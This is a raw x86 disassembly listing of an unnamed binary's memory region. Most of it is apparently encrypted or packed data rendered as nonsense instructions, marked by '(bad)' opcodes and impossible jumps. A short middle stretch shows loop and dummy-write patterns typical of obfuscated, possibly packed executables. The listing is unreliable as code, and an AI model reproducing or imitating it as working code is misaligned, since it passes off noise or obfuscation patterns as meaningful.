  41388e:	inc    ecx
  41388f:	pop    eax
  413890:	arpl   WORD PTR [ecx-0x63],bx
  413893:	cmp    eax,0xad615701
  413898:	xchg   esp,esp
  41389a:	sbb    eax,0xf40186c1
  41389f:	rcl    BYTE PTR [edx-0x4d],cl
  4138a2:	cmp    ecx,DWORD PTR [eax]
  4138a4:	push   ebp
  4138a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138a6:	(bad)  
  4138a7:	repnz push esi
  4138a9:	mov    al,cl
  4138ab:	fisttp DWORD PTR [edx+0x7f]
  4138ae:	jmp    0xec025927
  4138b3:	push   esp
  4138b4:	mov    edi,0xb62e035c
  4138b9:	loope  0x4138af
  4138bb:	pop    esp
  4138bc:	pop    ds
  4138bd:	sub    ebx,eax
  4138bf:	dec    edi
  4138c0:	repz xchg esi,eax
  4138c2:	ins    DWORD PTR es:[edi],dx
  4138c3:	adc    BYTE PTR ds:0xf71b9fa2,dh
  4138c9:	cmp    DWORD PTR [edx-0x7a],0x22
  4138cd:	push   es
  4138ce:	lods   eax,DWORD PTR ds:[esi]
  4138cf:	les    ebp,FWORD PTR [ebx+0x0]
  4138d2:	jmp    0x4138e5
  4138d4:	mov    edx,0xaf1e0a73
  4138d9:	mov    eax,0x470be7e4
  4138de:	scas   al,BYTE PTR es:[edi]
  4138df:	jmp    0x890ce95b
  4138e4:	out    dx,eax
  4138e5:	loope  0x4138f9
  4138e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138e8:	mov    WORD PTR [ecx-0x5c],?
  4138eb:	fisubr WORD PTR [eax]
  4138ed:	push   0x5e
  4138ef:	mov    dh,0x46
  4138f1:	jmp    0x8f7:0x6dee356a
  4138f8:	rol    DWORD PTR [ecx+0x65],0x43
  4138fc:	stos   BYTE PTR es:[edi],al
  4138fd:	rol    DWORD PTR [ecx-0x96f0e6a],0x86
  413904:	xchg   DWORD PTR [esi],ecx
  413906:	es mov edx,0xf4f70b26
  41390c:	jns    0x4138ce
  41390e:	add    eax,0x97f266da
  413913:	je     0x41389c
  413915:	call   0xd41289e8
  41391a:	xor    eax,0xf2840e38
  41391f:	dec    edx
  413920:	mov    eax,0x2fbe4815
  413925:	out    0x51,eax
  413927:	in     al,dx
  413928:	fdivr  DWORD PTR [ebp-0x78]
  41392b:	pop    ebp
  41392c:	jnp    0x41398b
  41392e:	jne    0x413994
  413930:	cs mov dh,0x34
  413933:	ss pop ebx
  413935:	into   
  413936:	iret   
  413937:	push   esi
  413938:	pushf  
  413939:	les    esi,FWORD PTR [ebp-0x35b1dbec]
  41393f:	mov    bl,0xc5
  413941:	mov    dl,0x98
  413943:	repnz sub al,0x6c
  413946:	scas   eax,DWORD PTR es:[edi]
  413947:	push   ebp
  413948:	int3   
  413949:	mov    al,0x48
  41394b:	sub    BYTE PTR [eax],bl
  41394d:	jmp    DWORD PTR [ebp+ecx*8-0x70cb9334]
  413954:	inc    ecx
  413955:	push   edi
  413956:	aaa    
  413957:	(bad)  
  413958:	data16 ja 0x413998
  41395b:	pusha  
  41395c:	fst    DWORD PTR [ebx+0x47]
  41395f:	mov    ds:0xdab376d5,eax
  413964:	add    DWORD PTR [ecx+ebx*8-0x1a],edx
  413968:	sbb    ebx,DWORD PTR [esp+ebx*2+0xc6f0f57]
  41396f:	mov    ah,0xab
  413971:	mov    bh,dh
  413973:	in     al,dx
  413974:	data16 scas al,BYTE PTR es:[edi]
  413976:	loope  0x4138fc
  413978:	cmp    BYTE PTR [esi+0x20],dh
  41397b:	and    DWORD PTR [edx],ebp
  41397d:	mov    esp,0x1355dfa9
  413982:	retf   0x744b
  413985:	pop    ebx
  413986:	push   esi
  413987:	pushf  
  413988:	cwde   
  413989:	xor    al,0x99
  41398b:	cs (bad) 
  41398e:	sbb    esi,edx
  413990:	gs cmc 
  413992:	sar    BYTE PTR [esi+0x73e036d0],1
  413998:	retf   
  413999:	push   esi
  41399a:	out    0x2f,eax
  41399c:	xor    al,0x42
  41399e:	cs jmp 0xf6b5613d
  4139a4:	jo     0x413926
  4139a6:	int    0xe8
  4139a8:	loope  0x413a05
  4139aa:	push   edi
  4139ab:	or     DWORD PTR [ecx-0x55],esp
  4139ae:	and    cl,BYTE PTR [ebx]
  4139b0:	fwait
  4139b1:	mov    dh,BYTE PTR [ebx+0x7b]
  4139b4:	pop    esi
  4139b5:	xchg   BYTE PTR [edx-0xf],dl
  4139b8:	ret    0x9b4d
  4139bb:	ins    DWORD PTR es:[edi],dx
  4139bc:	add    dh,BYTE PTR [ecx-0x20]
  4139bf:	in     al,0x7e
  4139c1:	jp     0x413979
  4139c3:	pusha  
  4139c4:	into   
  4139c5:	pop    eax
  4139c6:	cs pop ds
  4139c8:	and    DWORD PTR [esi+0x30],ecx
  4139cb:	iret   
  4139cc:	mov    ecx,0x26a7271c
  4139d1:	xchg   edi,eax
  4139d2:	mul    BYTE PTR [eax-0x435052d7]
  4139d8:	scas   eax,DWORD PTR es:[edi]
  4139d9:	or     eax,0x6f5c9e2d
  4139de:	dec    eax
  4139df:	stos   BYTE PTR es:[edi],al
  4139e0:	mov    ch,0xfe
  4139e2:	inc    ebp
  4139e3:	or     al,0xc7
  4139e5:	(bad)  
  4139e6:	push   edi
  4139e7:	neg    ch
  4139e9:	sub    al,0x12
  4139eb:	mov    bh,0xa6
  4139ed:	adc    dl,BYTE PTR [ebp-0x34604427]
  4139f3:	cmp    bl,dl
  4139f5:	icebp  
  4139f6:	pop    edi
  4139f7:	xor    DWORD PTR [ebx+eax*4+0x6b],esi
  4139fb:	test   al,0x7c
  4139fd:	and    al,0xe7
  4139ff:	pop    esi
  413a00:	push   0x25028fff
  413a05:	or     esp,ebp
  413a07:	std    
  413a08:	pop    edx
  413a09:	push   ecx
  413a0a:	bound  ebp,QWORD PTR [edx]
  413a0c:	mov    bl,0x32
  413a0e:	test   BYTE PTR [eax-0x4ab541cf],bl
  413a14:	aas    
  413a15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a16:	pop    esi
  413a17:	lods   al,BYTE PTR ds:[esi]
  413a18:	aaa    
  413a19:	dec    eax
  413a1a:	aad    0xdf
  413a1c:	call   0xa940b59a
  413a21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a22:	inc    ecx
  413a23:	xchg   ebx,eax
  413a24:	fstp   DWORD PTR [edx-0x4d474eab]
  413a2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a2b:	push   ds
  413a2c:	xchg   ebx,eax
  413a2d:	sub    al,0x52
  413a2f:	jmp    0xf053:0xf9c8669f
  413a36:	sbb    esp,edi
  413a38:	div    DWORD PTR [eax]
  413a3a:	jno    0x413a7f
  413a3c:	clc    
  413a3d:	inc    ecx
  413a3e:	int    0x83
  413a40:	mov    esi,0x7aa26793
  413a45:	push   esi
  413a46:	les    eax,FWORD PTR [ebx]
  413a48:	jg     0x4139ec
  413a4a:	inc    edi
  413a4b:	push   esp
  413a4c:	out    dx,eax
  413a4d:	retf   
  413a4e:	outs   dx,DWORD PTR ds:[esi]
  413a4f:	xor    eax,0xbd77e899
  413a54:	(bad)  
  413a55:	(bad)  
  413a56:	jmp    0x413d3a
  413a5b:	pop    ebx
  413a5c:	ins    DWORD PTR es:[edi],dx
  413a5d:	and    al,0xa9
  413a5f:	xor    dh,BYTE PTR [ecx+0x71]
  413a62:	ins    DWORD PTR es:[edi],dx
  413a63:	jp     0x413a20
  413a65:	or     esi,ecx
  413a67:	add    eax,0x7ee15a1a
  413a6c:	push   0x7eb97070
  413a71:	jo     0x413ae3
  413a73:	imul   edx,DWORD PTR [ebx-0x6a59101],0xfd5fc6af
  413a7d:	outs   dx,DWORD PTR ds:[esi]
  413a7e:	adc    DWORD PTR [edx+ebp*1],ebp
  413a81:	jbe    0x413abd
  413a83:	in     al,dx
  413a84:	dec    edx
  413a85:	xchg   esp,eax
  413a86:	div    BYTE PTR [eax+0x3fb6090]
  413a8c:	mov    dh,0x20
  413a8e:	push   ds
  413a8f:	cmp    DWORD PTR [edi+0x72a1b1af],ebp
  413a95:	sbb    BYTE PTR [ecx+ebx*8],ah
  413a98:	fcom   QWORD PTR [ebp-0xdcfdc6c]
  413a9e:	test   DWORD PTR [esi+0x12],eax
  413aa1:	push   ss
  413aa2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413aa3:	jb     0x413af5
  413aa5:	test   DWORD PTR [ebx-0x28],ebp
  413aa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413aa9:	dec    esp
  413aaa:	jns    0x413ad5
  413aac:	sub    eax,0xb6534c51
  413ab1:	mov    ebp,0x7a6a593f
  413ab6:	popa   
  413ab7:	out    dx,al
  413ab8:	lods   eax,DWORD PTR ds:[esi]
  413ab9:	loop   0x413a92
  413abb:	pop    ebp
  413abc:	and    eax,0xf851b628
  413ac1:	out    dx,al
  413ac2:	test   BYTE PTR [edx],bh
  413ac4:	inc    esi
  413ac5:	dec    edx
  413ac6:	mov    ebx,0xd7565313
  413acb:	xor    ch,dl
  413acd:	inc    ecx
  413ace:	pop    ebp
  413acf:	mov    ch,BYTE PTR [ecx]
  413ad1:	cmc    
  413ad2:	frstor [esi]
  413ad4:	pop    edx
  413ad5:	test   eax,0x82f8a9fa
  413ada:	out    dx,al
  413adb:	push   ebx
  413adc:	pop    esp
  413add:	xchg   edi,eax
  413ade:	stc    
  413adf:	stos   DWORD PTR es:[edi],eax
  413ae0:	test   DWORD PTR [ecx+edx*1],ebp
  413ae3:	imul   edx,ecx,0x41e7e26f
  413ae9:	leave  
  413aea:	les    ebp,FWORD PTR [edx]
  413aec:	pop    ss
  413aed:	lods   al,BYTE PTR ds:[esi]
  413aee:	push   edi
  413aef:	pop    edx
  413af0:	sbb    eax,0xc089f65e
  413af5:	mov    ds:0x218041b5,al
  413afa:	and    al,0x69
  413afc:	aam    0x7f
  413afe:	xor    eax,0x83b8812c
  413b03:	push   es
  413b04:	jo     0x413b52
  413b06:	into   
  413b07:	mov    ch,0xda
  413b09:	cld    
  413b0a:	icebp  
  413b0b:	imul   esi,DWORD PTR [ecx],0x8933cc5d
  413b11:	les    esp,FWORD PTR [esi-0x48]
  413b14:	test   BYTE PTR [eax],dh
  413b16:	out    dx,al
  413b17:	mov    esp,DWORD PTR [eax+0x6cce025a]
  413b1d:	jmp    0x413ad9
  413b1f:	add    dh,dh
  413b21:	adc    eax,0xb7bd65a1
  413b26:	(bad)  
  413b27:	and    DWORD PTR [ebp+0xf],0x5d
  413b2b:	add    BYTE PTR ds:0xe09160e6,dl
  413b31:	les    esi,FWORD PTR [eax+0x63259f11]
  413b37:	dec    edx
  413b38:	adc    BYTE PTR [ecx+0x50],ch
  413b3b:	xchg   edx,eax
  413b3c:	jg     0x413b9e
  413b3e:	push   ds
  413b3f:	aaa    
  413b40:	sub    BYTE PTR [eax],0x27
  413b43:	jp     0x413b52
  413b45:	mov    ch,0xc1
  413b47:	jle    0x413ba9
  413b49:	das    
  413b4a:	push   0x308c7f05
  413b4f:	inc    esp
  413b50:	pop    esp
  413b51:	cmp    al,0x3a
  413b53:	push   cs
  413b54:	ret    
  413b55:	retf   0x51ef
  413b58:	mov    WORD PTR [ebx+0x14f20281],?
  413b5e:	sbb    DWORD PTR [esi-0x52a96d6a],ecx
  413b64:	dec    edx
  413b65:	popa   
  413b66:	adc    ebx,eax
  413b68:	lock aas 
  413b6a:	pop    ebx
  413b6b:	(bad)  
  413b6d:	sub    esp,esp
  413b6f:	xor    bl,dh
  413b71:	jg     0x413b88
  413b73:	loopne 0x413b10
  413b75:	xchg   ebx,eax
  413b76:	pop    ss
  413b77:	frstor [edx-0x7614037c]
  413b7d:	or     eax,0x33cfd6c6
  413b82:	sub    eax,0x6c7f491e
  413b87:	ja     0x413b14
  413b89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b8a:	daa    
  413b8b:	cmp    bh,ah
  413b8d:	cmp    BYTE PTR [ecx],ch
  413b8f:	ror    BYTE PTR [edx],cl
  413b91:	les    edi,FWORD PTR [esi]
  413b93:	push   ebx
  413b94:	jbe    0x413b78
  413b96:	js     0x413b6e
  413b98:	or     bl,0x13
  413b9b:	fdivr  DWORD PTR [esi-0x10]
  413b9e:	xchg   edi,eax
  413b9f:	rol    DWORD PTR [edi+0x3e],cl
  413ba2:	or     eax,0x2b7af7c4
  413ba7:	push   eax
  413ba8:	and    al,0xce
  413baa:	sbb    edx,DWORD PTR [esi+0x4dadf868]
  413bb0:	cmp    ebx,DWORD PTR [edx-0x7d]
  413bb3:	add    bh,BYTE PTR ds:0xa4e7b9c
  413bb9:	mov    DWORD PTR [esi],esi
  413bbb:	jbe    0x413b7d
  413bbd:	sbb    BYTE PTR [esi-0x767cf357],bl
  413bc3:	mov    ?,WORD PTR ds:0x14957e5f
  413bc9:	inc    edi
  413bca:	rcr    BYTE PTR [ebx+0x76],1
  413bcd:	push   es
  413bce:	xlat   BYTE PTR ds:[ebx]
  413bcf:	xchg   DWORD PTR ds:0x42e381f2,ebx
  413bd5:	mov    eax,0x125ba2c
  413bda:	enter  0xdf45,0x41
  413bde:	cmp    BYTE PTR [ecx-0x9d50a87],ah
  413be4:	loop   0x413bc3
  413be6:	push   ebx
  413be7:	push   esp
  413be8:	outs   dx,DWORD PTR ds:[esi]
  413be9:	xor    al,0x98
  413beb:	xchg   BYTE PTR [esi+0x77f8b6ca],al
  413bf1:	adc    eax,0x8b83b276
  413bf6:	xchg   ebx,eax
  413bf7:	not    DWORD PTR [edx+0x4c]
  413bfa:	or     al,0xe5
  413bfc:	mov    ch,0x64
  413bfe:	fs mov esp,0x61aa7baf
  413c04:	sub    esp,DWORD PTR [eax+0x62108dfa]
  413c0a:	dec    ebx
  413c0b:	fldz   
  413c0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c0e:	lods   al,BYTE PTR ds:[esi]
  413c0f:	mov    eax,ds:0x4a89642a
  413c14:	arpl   WORD PTR [ebp+0x407146cb],si
  413c1a:	out    0x7b,eax
  413c1c:	icebp  
  413c1d:	mov    al,ah
  413c1f:	into   
  413c20:	cli    
  413c21:	inc    esi
  413c22:	iret   
  413c23:	push   edx
  413c24:	pop    ecx
  413c25:	out    dx,al
  413c26:	ret    0xb8b
  413c29:	(bad)  
  413c2a:	push   esi
  413c2b:	retf   0xf11b
  413c2e:	pop    es
  413c2f:	push   ebp
  413c30:	xor    ebp,DWORD PTR [ebx-0x7d345ec5]
  413c36:	push   ecx
  413c37:	cmp    al,BYTE PTR [ebx-0x6f5f59e3]
  413c3d:	jmp    0x6f1:0x3fe8f912
  413c44:	cmp    ebp,DWORD PTR [eax]
  413c46:	push   eax
  413c47:	sbb    BYTE PTR [edi-0x39],0xb0
  413c4b:	pop    ds
  413c4c:	mov    ah,ah
  413c4e:	int3   
  413c4f:	mov    al,0xc3
  413c51:	rol    BYTE PTR [edi-0x48],0x42
  413c55:	idiv   DWORD PTR ds:0xb44e2baa
  413c5b:	in     al,dx
  413c5c:	rcl    BYTE PTR [edx],1
  413c5e:	xor    DWORD PTR [esp+esi*1+0x90c8ae8],0x81bb5585
  413c69:	pop    esi
  413c6a:	lea    ecx,[edx-0x19]
  413c6d:	sbb    eax,0xc1d0dec0
  413c72:	pop    eax
  413c73:	dec    ecx
  413c74:	cmp    DWORD PTR [ebx-0x542f84d8],ecx
  413c7a:	(bad)  
  413c7b:	jno    0x413cba
  413c7d:	pop    ebp
  413c7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c7f:	mov    WORD PTR [edx],?
  413c81:	loope  0x413c8a
  413c83:	or     eax,0xb14de3b2
  413c88:	or     BYTE PTR [edx-0xccc7fd3],ch
  413c8e:	gs call 0xb690:0x8801c8f6
  413c96:	push   es
  413c97:	jle    0x413c60
  413c99:	dec    eax
  413c9a:	nop
  413c9b:	out    dx,al
  413c9c:	xchg   al,ah
  413c9e:	lock push eax
  413ca0:	hlt    
  413ca1:	inc    ecx
  413ca2:	push   edx
  413ca3:	nop
  413ca4:	daa    
  413ca5:	sbb    bh,BYTE PTR [ebx+ebx*1]
  413ca8:	icebp  
  413ca9:	ror    DWORD PTR [edi],cl
  413cab:	xlat   BYTE PTR ds:[ebx]
  413cac:	adc    esi,DWORD PTR [edi-0x3dbf8727]
  413cb2:	(bad)  
  413cb3:	xchg   esi,eax
  413cb4:	push   ebx
  413cb5:	fwait
  413cb6:	pop    esi
  413cb7:	sbb    DWORD PTR [ecx],esp
  413cb9:	fucomi st,st(0)
  413cbb:	popf   
  413cbc:	(bad)  
  413cbd:	jp     0x413cd3
  413cbf:	pop    ds
  413cc0:	xor    DWORD PTR [edi],0x7a
  413cc3:	les    edi,FWORD PTR [eax+0x45]
  413cc6:	add    eax,0x8f18f859
  413ccb:	test   BYTE PTR [eax-0x19],0xcb
  413ccf:	sbb    eax,0xe47ed880
  413cd4:	cmp    eax,DWORD PTR [eax+0x59]
  413cd7:	push   bx
  413cd9:	adc    esp,DWORD PTR ds:0x8536662d
  413cdf:	sbb    al,0x3d
  413ce1:	or     cl,BYTE PTR [eax-0x7aa34b61]
  413ce7:	or     al,0xfc
  413ce9:	pop    ds
  413cea:	dec    ebx
  413ceb:	retf   
  413cec:	in     al,dx
  413ced:	push   ds
  413cee:	dec    esi
  413cef:	add    BYTE PTR [edi],0xac
  413cf2:	lahf   
  413cf3:	cmp    ah,dl
  413cf5:	lods   al,BYTE PTR es:[esi]
  413cf7:	das    
  413cf8:	aad    0xe2
  413cfa:	repz sbb DWORD PTR [eax],edx
  413cfd:	mov    ds:0x681afe71,al
  413d02:	lock pop ebp
  413d04:	into   
  413d05:	sbb    al,0xe8
  413d07:	std    
  413d08:	into   
  413d09:	sub    cl,BYTE PTR [eax+0x2a]
  413d0c:	iret   
  413d0d:	sub    al,BYTE PTR [ebp+0xda4228a]
  413d13:	sbb    cl,BYTE PTR [ebp+ecx*2-0x51]
  413d17:	sub    al,0x54
  413d19:	xchg   edi,eax
  413d1a:	jmp    0x413d4d
  413d1c:	pop    es
  413d1d:	(bad)  
  413d1e:	ins    DWORD PTR es:[edi],dx
  413d1f:	mov    edi,0x16bd1962
  413d24:	jmp    0x815c:0xaf5e6a65
  413d2b:	or     edi,DWORD PTR [esi+0x7a]
  413d2e:	push   ecx
  413d2f:	adc    al,0xf2
  413d31:	(bad)  
  413d33:	(bad)  
  413d34:	loop   0x413d3e
  413d36:	retf   0xcc7b
  413d39:	fmul   DWORD PTR [ecx+0x458be045]
  413d3f:	cld    
  413d40:	sub    ecx,ecx
  413d42:	mov    ecx,DWORD PTR [ebp-0x20]
  413d45:	mov    DWORD PTR ds:0x42e6ff,0x1b
  413d4f:	cmp    DWORD PTR ds:0x42e6ff,0x0
  413d56:	je     0x413dab
  413d5c:	cmp    DWORD PTR ds:0x42e6ff,0x2
  413d63:	jne    0x413d7f
  413d69:	push   DWORD PTR [ebp-0xc]
  413d6c:	push   0x52a1
  413d71:	push   0x824e
  413d76:	push   DWORD PTR [ebp-0x18]
  413d79:	call   DWORD PTR ds:0x42e56b
  413d7f:	cmp    DWORD PTR ds:0x42e6ff,0x3
  413d86:	jne    0x413d99
  413d8c:	mov    esi,DWORD PTR ds:0x42e6ff
  413d92:	dec    esi
  413d93:	mov    DWORD PTR ds:0x42e6ff,esi
  413d99:	mov    esi,DWORD PTR ds:0x42e6ff
  413d9f:	dec    esi
  413da0:	mov    DWORD PTR ds:0x42e6ff,esi
  413da6:	jmp    0x413d4f
  413dab:	mov    esi,0x7510855
  413db0:	or     DWORD PTR ds:0x42e70f,0x42fd86
  413dba:	xor    eax,esi
  413dbc:	add    eax,ebx
  413dbe:	cmp    ecx,eax
  413dc0:	mov    DWORD PTR ds:0x42e12c,0x588b
  413dca:	je     0x414b4e
  413dd0:	push   DWORD PTR [ebp-0x20]
  413dd3:	dec    DWORD PTR ds:0x42e6f7
  413dd9:	push   DWORD PTR [ebp+0x8]
  413ddc:	xor    DWORD PTR ds:0x42fcd9,0x42e120
  413de6:	call   0x405485
  413deb:	mov    DWORD PTR [ebp-0x14],eax
  413dee:	and    DWORD PTR ds:0x42e6fb,0x0
  413df8:	jmp    0x413e08
  413dfd:	mov    eax,ds:0x42e6fb
  413e02:	inc    eax
  413e03:	mov    ds:0x42e6fb,eax
  413e08:	cmp    DWORD PTR ds:0x42e6fb,0x10
  413e0f:	jae    0x413e33
  413e15:	cmp    DWORD PTR ds:0x42e6fb,0x16
  413e1c:	jne    0x413e28
  413e22:	call   DWORD PTR ds:0x42e48b
  413e28:	jmp    0x413dfd
  413e2d:	sub    DWORD PTR ds:0x42fd01,ecx
  413e33:	mov    eax,DWORD PTR [ebp-0x4]
  413e36:	or     DWORD PTR ds:0x42e6f7,edx
  413e3c:	mov    ecx,DWORD PTR [ebp-0x14]
  413e3f:	adc    DWORD PTR ds:0x42fd8a,0x2715
  413e49:	xor    eax,esi
  413e4b:	dec    DWORD PTR ds:0x42e703
  413e51:	add    eax,ebx
  413e53:	mov    DWORD PTR ds:0x42e11c,0x499a
  413e5d:	cmp    ecx,eax
  413e5f:	je     0x414b4e
  413e65:	not    eax
  413e67:	mov    eax,DWORD PTR [ebp-0x14]
  413e6a:	mov    eax,DWORD PTR [eax+0x18]
  413e6d:	mov    DWORD PTR [ebp-0x20],eax
  413e70:	xor    DWORD PTR ds:0x42e6fb,0x4f5
  413e7a:	jmp    0x41415e
  413e7f:	lods   al,BYTE PTR ds:[esi]
  413e80:	mov    WORD PTR [edx],gs
  413e82:	loopne 0x413eae
  413e84:	outs   dx,BYTE PTR ds:[esi]
  413e85:	push   0x4c
  413e87:	repz push edi
  413e89:	scas   eax,DWORD PTR es:[edi]
  413e8a:	(bad)  
  413e8b:	lahf   
  413e8c:	ds jmp 0x413ecf
  413e8f:	inc    edi
  413e90:	jbe    0x413f02
  413e92:	jo     0x413e4d
  413e94:	jle    0x413f06
  413e96:	jo     0x413f05
  413e98:	or     DWORD PTR [eax-0x3b],0xbbf07421
  413e9f:	sbb    esi,DWORD PTR [ecx]
  413ea1:	retf   0x460
  413ea4:	mov    DWORD PTR ds:0x226315e,edi
  413eaa:	sub    eax,0xd7328af9
  413eaf:	jp     0x413e73
  413eb1:	pop    es
  413eb2:	popf   
  413eb3:	test   eax,0x1ff7085c
  413eb8:	mov    eax,0x3a9b73d1
  413ebd:	push   gs
  413ebf:	ins    DWORD PTR es:[edi],dx
  413ec0:	pushf  
  413ec1:	sub    edi,edi
  413ec3:	enter  0x9699,0x4f
  413ec7:	stos   DWORD PTR es:[edi],eax
  413ec8:	repnz imul ecx,DWORD PTR [edx-0x28b7b726],0x3be82e04
  413ed3:	sbb    DWORD PTR [ebx],eax
  413ed5:	pop    edi
  413ed6:	pop    es
  413ed7:	pop    edi
  413ed8:	dec    edx
  413ed9:	adc    dh,BYTE PTR [esp+eax*8]
  413edc:	fcom   DWORD PTR [esi+0x6f31fdb8]
  413ee2:	or     ecx,edx
  413ee4:	iret   
  413ee5:	sbb    eax,0x17ec60a1
  413eea:	jecxz  0x413efc
  413eec:	pop    edi
  413eed:	jecxz  0x413f21
  413eef:	cmp    DWORD PTR [eax],ecx
  413ef1:	outs   dx,BYTE PTR ds:[esi]
  413ef2:	and    al,0x82
  413ef4:	xor    al,0x71
  413ef6:	std    
  413ef7:	or     ebp,DWORD PTR [edx-0x1c]
  413efa:	xor    cl,al
  413efc:	cmp    al,0xbf
  413efe:	jb     0x413f71
  413f00:	sbb    edi,edi
  413f02:	cmp    al,0xb6
  413f04:	inc    ebx
  413f05:	inc    ecx
  413f06:	stos   BYTE PTR es:[edi],al
  413f07:	and    al,0x11
  413f09:	daa    
  413f0a:	sbb    DWORD PTR es:[eax],ebx
  413f0d:	fiadd  WORD PTR [esi-0x80]
  413f10:	jne    0x413eeb
  413f12:	lods   al,BYTE PTR ds:[esi]
  413f13:	jp     0x413f54
  413f15:	lock test BYTE PTR [edx+0x72],ah
  413f19:	and    dh,bl
  413f1b:	adc    eax,0x97f3a1e7
  413f20:	adc    eax,0x1e2b6aa
  413f25:	jbe    0x413f30
  413f27:	(bad)  
  413f28:	enter  0x9237,0x62
  413f2c:	test   al,0x97
  413f2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f2f:	es out dx,eax
  413f31:	into   
  413f32:	mov    ds:0x4f8b45f6,eax
  413f37:	pop    ebx
  413f38:	aaa    
  413f39:	push   esp
  413f3a:	arpl   WORD PTR [ebp-0x32c942ab],dx
  413f40:	mov    ds:0xaa8c538a,al
  413f45:	and    eax,0xd7719edd
  413f4a:	test   BYTE PTR [eax],bh
  413f4c:	aaa    
  413f4d:	ja     0x413f94
  413f4f:	push   eax
  413f50:	sub    ebp,edi
  413f52:	xchg   DWORD PTR [edx],eax
  413f54:	fisub  WORD PTR [eax+0x67]
  413f57:	das    
  413f58:	add    DWORD PTR [edx+0x50],edx
  413f5b:	imul   esi,DWORD PTR [ebx+0x67],0xa88eeec7
  413f62:	cmp    al,0xb6
  413f64:	add    ah,ah
  413f66:	xor    ch,BYTE PTR ds:0xd210cea8
  413f6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f6d:	inc    esi
  413f6e:	mov    ebp,0x612f3611
  413f73:	push   0xffffff8e
  413f75:	dec    ebp
  413f76:	or     eax,DWORD PTR [edi+edi*1+0x7de77f82]
  413f7d:	adc    eax,0xf1590b89
  413f82:	jne    0x413f55
  413f84:	jg     0x413fe3
  413f86:	pop    ebx
  413f87:	jns    0x413fd2
  413f89:	mov    esi,0x7f3d2fbc
  413f8e:	mov    edx,0x102089a
  413f93:	mov    bh,0xc8
  413f95:	(bad)  
  413f96:	sbb    DWORD PTR [ebx+0x6f248f45],eax
  413f9c:	pop    edi
  413f9d:	mov    ch,BYTE PTR [ebx+eiz*2-0x42f2d806]
  413fa4:	retf   0x2d3
  413fa7:	add    DWORD PTR [edx],edx
  413fa9:	cmp    DWORD PTR [edi+ebx*1],eax
  413fac:	out    0xba,eax
  413fae:	test   al,0x1e
  413fb0:	dec    ebx
  413fb1:	add    DWORD PTR [edi-0x45404528],esp
  413fb7:	pop    esi
  413fb8:	ins    BYTE PTR es:[edi],dx
  413fb9:	dec    eax
  413fba:	inc    edx
  413fbb:	add    BYTE PTR [edi],cl
  413fbd:	inc    ebx
  413fbe:	dec    edi
  413fbf:	sbb    DWORD PTR [edi],ebp
  413fc1:	int3   
  413fc2:	call   0x92f2846d
  413fc7:	stc    
  413fc8:	imul   eax,esi,0x1d0dc3f8
  413fce:	push   edx
  413fcf:	cmc    
  413fd0:	push   ecx
  413fd1:	jno    0x414045
  413fd3:	xlat   BYTE PTR ds:[ebx]
  413fd4:	dec    ebp
  413fd5:	imul   edx,eax,0x3c7edb45
  413fdb:	sbb    cl,al
  413fdd:	inc    eax
  413fde:	gs pop esi
  413fe0:	idiv   DWORD PTR [ecx-0x5c]
  413fe3:	stos   BYTE PTR es:[edi],al
  413fe4:	retf   0xf765
  413fe7:	xchg   edi,eax
  413fe8:	pop    ds
  413fe9:	jecxz  0x413f76
  413feb:	sbb    esi,ebx
  413fed:	popf   
  413fee:	or     dh,al
  413ff0:	out    0x6a,al
  413ff2:	dec    ebx
  413ff3:	and    ebp,DWORD PTR [edx]
  413ff5:	aam    0xa6
  413ff7:	cdq    
  413ff8:	pop    edx
  413ff9:	imul   edx,esi,0x77
  413ffc:	mov    eax,DWORD PTR [ecx+0x28e3ee6f]
  414002:	xor    al,0xdf
  414004:	test   DWORD PTR [esp+ebx*4],edi
  414007:	pushf  
  414008:	fistp  DWORD PTR [esi-0x2e]
  41400b:	push   cs
  41400c:	jae    0x413fde
  41400e:	iret   
  41400f:	xchg   ecx,eax
  414010:	loope  0x413fbb
  414012:	or     ecx,ecx
  414014:	xor    DWORD PTR [edx-0x40],edx
  414017:	and    edi,ebp
  414019:	xchg   esp,edx
  41401b:	sbb    edx,esi
  41401d:	jae    0x414017
  41401f:	adc    al,0x12
  414021:	dec    edi
  414022:	bound  edi,QWORD PTR [ecx]
  414024:	mov    edi,0xf6b7be3a
  414029:	or     al,0xab
  41402b:	repz call 0x17772f08
  414031:	pop    edi
  414032:	cmc    
  414033:	xchg   edi,eax
  414034:	gs cdq 
  414036:	or     DWORD PTR [edx],ebp
  414038:	repz fsubr st,st(0)
  41403b:	inc    edi
  41403c:	fsub   st(1),st
  41403e:	nop
  41403f:	xor    DWORD PTR [ebx],edx
  414041:	shr    BYTE PTR [ebx],1
  414043:	int3   
  414044:	mov    bh,0x2a
  414046:	push   edx
  414047:	cvttpd2pi mm3,XMMWORD PTR [esi]
  41404b:	push   ss
  41404c:	sub    ebx,DWORD PTR [edi+0xb]
  41404f:	or     eax,0x4c2d26eb
  414054:	loope  0x414034
  414056:	add    dh,BYTE PTR [edx-0x46]
  414059:	dec    ebp
  41405a:	rol    DWORD PTR [edi-0x60],cl
  41405d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41405e:	mov    esi,0x58ce4712
  414063:	jle    0x414015
  414065:	inc    bx
  414067:	push   es
  414068:	fistp  DWORD PTR [esi-0x74830ee1]
  41406e:	add    edi,DWORD PTR [esi]
  414070:	(bad)  
  414071:	pop    esp
  414072:	cmc    
  414073:	fst    DWORD PTR [edx+0x2fec4a59]
  414079:	daa    
  41407a:	ret    0xa805
  41407d:	xchg   ecx,eax
  41407e:	in     al,dx
  41407f:	ds fmulp st(5),st
  414082:	fcomi  st,st(4)
  414084:	popf   
  414085:	stos   BYTE PTR es:[edi],al
  414086:	jbe    0x4140d4
  414088:	int    0xe5
  41408a:	and    DWORD PTR [esi+ebp*2+0x1c604253],eax
